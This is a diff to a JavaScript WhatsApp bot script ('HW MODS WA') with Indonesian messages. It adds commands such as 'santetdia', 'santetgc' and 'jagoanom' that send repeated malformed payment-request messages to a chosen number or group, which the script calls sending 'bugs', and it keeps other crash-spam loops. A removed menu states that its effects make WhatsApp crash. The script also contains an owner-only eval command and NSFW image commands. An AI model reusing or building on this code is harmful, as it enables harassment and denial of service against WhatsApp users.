@@ -210,14 +210,25 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "" } : {})
 const bal= (teks) => {
 haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `HW MODS WA ${ngazap(prefix)}`,"body": `HW MODS WA ${ngazap(prefix)}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: doc })
 } 
-const bangkal= (teks) => {
-haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: hw })
-} 
 // Target
 const reply = (teks) => {
 return haikal.sendMessage(m.chat, { text: teks, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`, "previewType": "PHOTO","thumbnailUrl": ``,"thumbnail": kalimage,"sourceUrl": `https://youtube.com/c/HwModsWa857`}}}, { quoted: hw })
 } 
 //=================================================//
+const anjay = (teks) => {
+ haikal.sendMessage(m.chat, { image: kalimage, caption: teks, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
+previewType: "PHOTO",
+showAdAttribution: true,
+sourceUrl: `https://youtube.com/c/HwModsWa857`,
+thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+thumbnail: kalimage,
+}
+}}, { quoted:hw})
+}
+//=================================================//
+const deploy = (teks) => {
+  haikal.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
+}
 //=================================================//
 try {
 let isNumber = x => typeof x === 'number' && !isNaN(x)
@@ -361,14 +372,14 @@ return
 if (AntiLink) {
 linkgce = await haikal.groupInviteCode(from)
 if (budy.includes(`https://chat.whatsapp.com/${linkgce}`)) {
-m.reply(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
+anjay(`\`\`\`「 Detect Link 」\`\`\`\n\nAnda tidak akan dikick bot karena yang anda kirim adalah link group yg ada di group ini`)
 } else if (isUrl(m.text)) {
 bvl = `\`\`\`「 Detect Link 」\`\`\`\n\nAdmin telah mengirim link, admin dibebaskan untuk mengirim link apapun`
-if (isAdmins) return m.reply(bvl)
-if (m.key.fromMe) return m.reply(bvl)
-if (isCreator) return m.reply(bvl)
+if (isAdmins) return anjay(bvl)
+if (m.key.fromMe) return anjay(bvl)
+if (isCreator) return anjay(bvl)
 kice = m.sender
-await haikal.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
+await haikal.groupParticipantsUpdate(m.chat, [kice], 'remove').then((res) => anjay(jsonformat(res))).catch((err) => anjay(jsonformat(err)))
 haikal.sendMessage(from, {text:`\`\`\`「 Detect Link 」\`\`\`\n\n@${kice.split("@")[0]} Telah dikick karena send link di group ini`, contextInfo:{mentionedJid:[kice]}}, {quoted:m})
 } else {
 }
@@ -420,15 +431,15 @@ jawaban = tebaklagu[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
 await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lagu', buttonText: { displayText: 'Tebak Lagu' }, type: 1 }], `🎮 Tebak Lagu 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
 delete tebaklagu[m.sender.split('@')[0]]
-} else bangkal('*Jawaban Salah!*')
+} else anjay('*Jawaban Salah!*')
 }
 if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
 jawaban = kuismath[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
-await bangkal(`🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
+await anjay(`🎮 Kuis Matematika🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? kirim ${prefix}math mode`)
 delete kuismath[m.sender.split('@')[0]]
-} else bangkal('*Jawaban Salah!*')
+} else anjay('*Jawaban Salah!*')
 }
 if (tebakgambar.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
@@ -436,7 +447,7 @@ jawaban = tebakgambar[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
 await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak gambar', buttonText: { displayText: 'Tebak Gambar' }, type: 1 }], `🎮 Tebak Gambar 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
 delete tebakgambar[m.sender.split('@')[0]]
-} else bangkal('*Jawaban Salah!*')
+} else anjay('*Jawaban Salah!*')
 }
 if (tebakkata.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
@@ -444,7 +455,7 @@ jawaban = tebakkata[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
 await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kata', buttonText: { displayText: 'Tebak Kata' }, type: 1 }], `🎮 Tebak Kata 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
 delete tebakkata[m.sender.split('@')[0]]
-} else bangkal('*Jawaban Salah!*')
+} else anjay('*Jawaban Salah!*')
 }
 if (caklontong.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
@@ -454,7 +465,7 @@ if (budy.toLowerCase() == jawaban) {
 await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lontong', buttonText: { displayText: 'Tebak Lontong' }, type: 1 }], `🎮 Cak Lontong 🎮\n\nJawaban Benar 🎉\n*${deskripsi}*\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
 delete caklontong[m.sender.split('@')[0]]
 delete caklontong_desk[m.sender.split('@')[0]]
-} else bangkal('*Jawaban Salah!*')
+} else anjay('*Jawaban Salah!*')
 }
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
@@ -462,7 +473,7 @@ jawaban = tebakkalimat[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
 await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak kalimat', buttonText: { displayText: 'Tebak Kalimat' }, type: 1 }], `🎮 Tebak Kalimat 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
 delete tebakkalimat[m.sender.split('@')[0]]
-} else bangkal('*Jawaban Salah!*')
+} else anjay('*Jawaban Salah!*')
 }
 if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
@@ -470,7 +481,7 @@ jawaban = tebaklirik[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
 await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
 delete tebaklirik[m.sender.split('@')[0]]
-} else bangkal('*Jawaban Salah!*')
+} else anjay('*Jawaban Salah!*')
 }
 if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
 kuis = true
@@ -478,7 +489,7 @@ jawaban = tebaktebakan[m.sender.split('@')[0]]
 if (budy.toLowerCase() == jawaban) {
 await haikal.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, haikal.user.name, m)
 delete tebaktebakan[m.sender.split('@')[0]]
-} else bangkal('*Jawaban Salah!*')
+} else anjay('*Jawaban Salah!*')
 }
 //=================================================//
 if (budy.startsWith('©️')) {
@@ -486,9 +497,9 @@ if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
 try {
-return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
+return anjay(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
 } catch (e) {
-m.reply(e)
+anjay(e)
 }
 }
 //=================================================//
@@ -536,13 +547,13 @@ let reg = /^(gunting|batu|kertas)/i
 if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
 roof.pilih = reg.exec(m.text.toLowerCase())[0]
 roof.text = m.text
-bangkal(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
+anjay(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
 if (!roof.pilih2) haikal.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
 }
 if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
 roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
 roof.text2 = m.text
-bangkal(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
+anjay(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
 if (!roof.pilih) haikal.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
 }
 let stage = roof.pilih
@@ -571,14 +582,14 @@ if (!user) continue
 let afkTime = user.afkTime
 if (!afkTime || afkTime < 0) continue
 let reason = user.afkReason || ''
-bangkal(`
+anjay(`
 Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
 Waktu ${clockString(new Date - afkTime)}
 `.trim())
 }
 if (db.data.users[m.sender].afkTime > -1) {
 let user = global.db.data.users[m.sender]
-bangkal(`
+anjay(`
 Hello Saya Bot Hw Mods${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
 Selama ${clockString(new Date - user.afkTime)}
 `.trim())
@@ -601,6 +612,36 @@ haikal.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }
 }
 break
 //=================================================//
+case 'poll': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": "HALO 👋 SAYA BOT HW MODS WA",
+"options": [
+	{
+"optionName": "KATANYA WA KEBAL"
+	},
+	{
+"optionName": "BERANI VOTE GA"
+	},
+	{
+"optionName": "VOTE LAH SEMUA"
+	},
+	{
+"optionName": "KATANYA KEBAL"
+	},
+	{
+"optionName": "SALAM BROTHER BY HW MODS WA"
+	}
+],
+"selectableOptionsCount": 5
+	}
+}), { userJid: m.chat, quoted: doc })
+haikal.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+deploy('sukses sendbug')
+}
+break
 case 'troli2': {
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
@@ -623,6 +664,50 @@ var order = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 }
 }), { userJid: m.chat, quoted: doc })
 haikal.relayMessage(m.chat, order.message, { messageId: order.key.id })
+}
+break
+case 'santetdia': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} nomor target|amount spam|timer\nExample : ${command} 62888s.whatsapp.net|1|10s\n\n\ns = Second/Detik\n\n`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+anjay(`Baiklah Tuan`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `MY DEVELOPER HW MODS WA`,
+}
+}}), { userJid: m.chat, quoted: doc})
+haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+anjay(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
+}
+break
+case 'santetgc': {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (args.length < 1) return anjay(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < jumlah; i++) {
+anjay(`Baiklah Tuan`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `MY DEVELOPER HW MODS WA`,
+}
+}}), { userJid: m.chat, quoted: doc})
+haikal.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+anjay(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
 }
 break
 case 'ducu': {
@@ -964,6 +1049,20 @@ tekteka = `Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`
 reply(tekteka)
 }
 break
+case 'jagoanom' : {
+if (!isCreator) return
+if (isBan) throw sticBanLu(from)
+if (!isRegistered) return replyReg(mess.verif)
+haikal.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC HW MODS WA`,"body": `Selamat ${salam} kak ${pushname}`,
+mimetype: 'audio/mpeg', caption: `${buttonkal}`,
+showAdAttribution: true,
+sourceUrl: `https://youtube.com/c/HwModsWa857`,
+thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
+thumbnail: kalimage,
+}
+}}}}}, { quoted:doc})
+}
+break
 //=================================================//
 /*BUG WACAP */
 case 'ampas1' : {
@@ -1024,14 +1123,14 @@ if (!isCreator) return
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
-reply(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
+deploy(`${m.pushName} Hello Saya Bot Hw Mods${text ? ': ' + text : ''}`)
 }
 break
 //=================================================//
 case 'bugstik':{
 if (!isCreator) throw sticOwner(from)
 if (isBan) throw sticBanLu(from)
-if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
@@ -1058,7 +1157,7 @@ participant: `0@s.whatsapp.net`,
 }
 }})
 }
-m.reply(`Sukses Send Bug Sebanyak ${jumlah}`)
+deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 //=================================================//
@@ -1066,7 +1165,7 @@ case 'bugie':{
 if (!isCreator) return
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+if (args.length == 0) return anjay(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
 jumlah = `${encodeURI(q)}`
 ydd = `Hallo Aku haikal`
 for (let i = 0; i < jumlah; i++) {
@@ -1089,7 +1188,7 @@ participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {
 }
 }})
 }
-bal(`Sukses Send Bug Sebanyak ${jumlah}`)
+deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
 //=================================================//
@@ -1100,7 +1199,7 @@ if (!isCreator) return
 if (!/video/.test(mime) && !/image/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`
 let anu = await store.chats.all().map(v => v.id)
 let doc ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: fs.readFileSync('./baseikal/image/pict.jpg'), surface: 200, message: `ZIM-BOT-INC`, orderTitle: 'HW MODS WA', sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
-m.reply(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
+anjay(`*Send Broadcast To* ${anu.length} *Group Chat, Time ${anu.length * 1.5} minutes*`)
 for (let i of anu) {
 await sleep(1500)
 let butoon = [{
@@ -1128,11 +1227,11 @@ haikal.sendMessage(i, {video: buffer, caption: `${junn}`}, { quoted: doc })
 } else if (/audio/.test(mime)) {
 haikal.sendMessage(i, {audio: buffer, mimetype: 'audio/mpeg'}, { quoted : doc })
 } else {
-m.reply(`*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`)
+anjay(`*Send/Reply Video/Audio/Image You Want to Broadcast With Caption* ${prefix + command}`)
 }
 await fs.unlinkSync(media)
 }
-m.reply(` *Send Broadcast To* ${anu.length} *Chats*`)
+anjay(` *Send Broadcast To* ${anu.length} *Chats*`)
 }
 break
 //=================================================//
@@ -1143,12 +1242,12 @@ if (!isRegistered) return replyReg(mess.verif)
 if (!text) throw `*Type some text*\n\nExample : ${prefix + command} hwmods`
 let doc = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `© ${botname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${haikal.user.name},;;;\nFN:${botname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': await getBuffer(picak+'Brodcast'), thumbnail: await getBuffer(picak+'Brodcast'),sendEphemeral: true}}}
 let anu = await store.chats.all().map(v => v.id)
-m.reply(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
+anjay(`*Send Broadcast To* ${anu.length} Chat\n*Time ${anu.length * 1.5} seconds*`)
 for (let yoi of anu) {
 await sleep(1500)
 haikal.sendMessage(yoi, {text:`${text}`}, {quoted:doc})
 }
-m.reply('*Success Broadcast*')
+anjay('*Success Broadcast*')
 }
 break
 //=================================================//
@@ -1206,13 +1305,13 @@ break
 case 'bugsange': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!m.isGroup) return m.reply(mess.group)
-if (!isBotAdmins) return m.reply(mess.botAdmin)
-if (!isAdmins && !isCreator) return m.reply(mess.admin)
+if (!m.isGroup) return anjay(mess.group)
+if (!isBotAdmins) return anjay(mess.botAdmin)
+if (!isAdmins && !isCreator) return anjay(mess.admin)
 if (args[0] === "on") {
-if (AntiNsfww) return m.reply('Sudah Aktif')
+if (AntiNsfww) return anjay('Sudah Aktif')
 ntnsfww.push(from)
-m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
+anjay('Sukses Telah mengaktifkan Bug Sange Di group Ini')
 var groupe = await haikal.groupMetadata(from)
 var members = groupe['participants']
 var mems = []
@@ -1221,10 +1320,10 @@ mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
 })
 haikal.sendMessage(from, {text: `\`\`\`「 ⚠️ Peringatan ⚠️ 」\`\`\`\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
 } else if (args[0] === "off") {
-if (!AntiNsfww) return m.reply('Sudah Non Aktif')
+if (!AntiNsfww) return anjay('Sudah Non Aktif')
 let off = ntnsfww.indexOf(from)
 ntnsfww.splice(off, 1)
-m.reply('Sukses Mematikan Bug Sange di group ini')
+anjay('Sukses Mematikan Bug Sange di group ini')
 } else {
 let buttonsntnsfww = [
 { buttonId: `${command} on`, buttonText: { displayText: 'On' }, type: 1 },
@@ -1240,7 +1339,7 @@ break
 case 'bugcrot' :
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!m.isGroup) return m.reply(mess.group)
+if (!m.isGroup) return anjay(mess.group)
 if (!AntiNsfww) return reply(mess.nsfw)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
  let bugcrotbot = [
@@ -1259,7 +1358,7 @@ break
 case 'bugahay' :
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!m.isGroup) return m.reply(mess.group)
+if (!m.isGroup) return anjay(mess.group)
 if (!AntiNsfww) return reply(mess.nsfw)
 reply(mess.wait)
  waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
@@ -1467,241 +1566,14 @@ if (!isRegistered) return replyReg(mess.verif)
  }
  break
 //=================================================//
-case 'bugvip':{
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-if (!isRegistered) return replyReg(mess.verif)
-let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-listMessage :{
-title: `SILAHKAN PILIH BUG NYA \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${m.sender.split('@')[0]}\n Status : ${isCreator ? 'Owner' : 'User'}`,
-description: "PILIH DI DALAM LIST",
-buttonText: "CLICK DISINI",
-footerText: "",
-listType: "SINGLE_SELECT",
-sections: [{
-"title": "LOADING",
-"rows": [
-{
-"title": "hu",
-"description": "Sukses ✓",
-"rowId": `${prefix}hu`
-}
-]
-},
-{
-"title": "LOADINGt",
-"rows": [
-{
-"title": "hi",
-"description": "Sukses ✓",
-"rowId": `${prefix}hi`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "ha",
-"description": "Sukses ✓",
-"rowId": `${prefix}ha`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "he",
-"description": "Sukses ✓",
-"rowId": `${prefix}he`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "ba",
-"description": "Sukses ✓",
-"rowId": `${prefix}ba`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "be",
-"description": "Sukses ✓",
-"rowId": `${prefix}be`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}bu`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}bi`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}ca`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}ci`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}cu`
-}
-]
-},
-{
-"title": "LOADING",
-"rows": [
-{
-"title": "Bug Vn",
-"description": "Sukses ✓",
-"rowId": `${prefix}co`
-}
-]
-},
-],
-listType: 1
-}
-}), { userJid: m.chat, quoted: doc })
-haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
-}
-break
-//=================================================//
-case 'senbug':{
-if (!isCreator) return
-if (isBan) throw sticBanLu(from)
-if (!isRegistered) return replyReg(mess.verif)
-let template = await generateWAMessageFromContent(m.chat, proto.Message.fromObject({
-listMessage :{
-title: `Silahkan Pilih Bug Yang Anda Inginkan \n\n Name : ${pushname} ${ucapanWaktu}\n Number : ${m.sender.split('@')[0]}\n Status : ${isCreator ? 'Owner' : 'User'}`,
-description: "PERINGATAN!!!",
-buttonText: "CLICK DISINI",
-footerText: "EFFECT INI MEMBUAT WHATSAPP MENJADI CRASH",
-listType: "SINGLE_SELECT",
-sections: [{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug1",
-"description": "Bug Berjenis Quoted Gambar",
-"rowId": `${prefix}bug1`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug2",
-"description": "Bug Berjenis Lokasi",
-"rowId": `${prefix}bug2`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug3",
-"description": "Bug Berjenis Troli",
-"rowId": `${prefix}bug3`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug4",
-"description": "Bug Berjenis Audio",
-"rowId": `${prefix}bug4`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug5",
-"description": "Bug Berjenis Group",
-"rowId": `${prefix}bug5`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug6",
-"description": "Bug Berjenis Contact",
-"rowId": `${prefix}bug6`
-}
-]
-},
-{
-"title": "Menu Bug",
-"rows": [
-{
-"title": "Bug7",
-"description": "Bug Berjenis Dokumen",
-"rowId": `${prefix}bug7`
-}
-]
-}
-],
-listType: 1
-}
-}), { userJid: m.chat, quoted: doc })
-haikal.relayMessage(m.chat, template.message, { messageId: template.key.id })
-}
-break
 //=================================================//
 case 'inspect': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!args[0]) return m.reply("Linknya?")
+if (!args[0]) return anjay("Linknya?")
 let linkRegex = args.join(" ")
 let coded = linkRegex.split("https://chat.whatsapp.com/")[1]
-if (!coded) return m.reply("Link Invalid")
+if (!coded) return anjay("Link Invalid")
 haikal.query({
 tag: "iq",
 attrs: {
@@ -1967,7 +1839,7 @@ break
 case 'anime': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif) 
-if (!text) return m.reply(`you are looking for what anime apa?\n\nEXAMPLE ${prefix}anime naruto`)
+if (!text) return anjay(`you are looking for what anime apa?\n\nEXAMPLE ${prefix}anime naruto`)
 anu = await fetchJson(`https://api.jikan.moe/v4/anime?q=${text}`)
 let sections = [] 
 for (let i of anu.data) {
@@ -1997,11 +1869,11 @@ break
 case 'translate': case 'terjemahan': case 'tr': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-if (!args.join(" ")) return m.reply("Text?")
+if (!args.join(" ")) return anjay("Text?")
 tes = await fetchJson (`https://megayaa.herokuapp.com/api/translate?to=en&kata=${args.join(" ")}`)
 Infoo = tes.info
 Detek = tes.translate
-m.reply(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
+anjay(`🌐Translate : ${Detek}\n📘Results : ${Infoo}`)
 }
 break
 //=================================================//
@@ -2027,7 +1899,7 @@ case 'darkjoke':{
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
 anu = await getBuffer(`https://api.xteam.xyz/asupan/darkjoke?APIKEY=apivproject`)
-haikal.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
+haikal.sendMessage(m.chat, { image: anu, caption: `Beliau ini....` }, { quoted: m}).catch((err) => anjay('Maaf server Xteam sedang down'))
 }
 break
 //=================================================//
@@ -2035,7 +1907,7 @@ case 'meme':{
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
 anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme?APIKEY=apivproject`)
-haikal.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
+haikal.sendMessage(m.chat, { image: anu, caption: `Bilek` }, { quoted: m}).catch((err) => anjay('Maaf server Xteam sedang down'))
 }
 break
 //=================================================//
@@ -2043,18 +1915,18 @@ case 'meme2':{
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
 anu = await getBuffer(`https://api.xteam.xyz/randomimage/meme2?APIKEY=apivproject`)
-haikal.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => m.reply('Maaf server Xteam sedang down'))
+haikal.sendMessage(m.chat, { image: anu, caption: `bilek` }, { quoted: m}).catch((err) => anjay('Maaf server Xteam sedang down'))
 }
 break
 //=================================================//
 case 'ss': case 'ssweb': {
 if (isBan) throw sticBanLu(from)
 if (!isRegistered) return replyReg(mess.verif)
-////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(mess.endLimit)
+////if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return anjay(mess.endLimit)
 if (!text) throw `Example : ${prefix + command} Url`
 anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${text}`) 
 buf = await getBuffer(anu.screenshot) 
-haikal.sendMessage(m.chat, { image: { url: anu.screenshot }, jpegThumbnail:buf, caption: `*${command} From ${text}*` }, { quoted: m }).catch((err) => m.reply(jsonformat('*error*')))
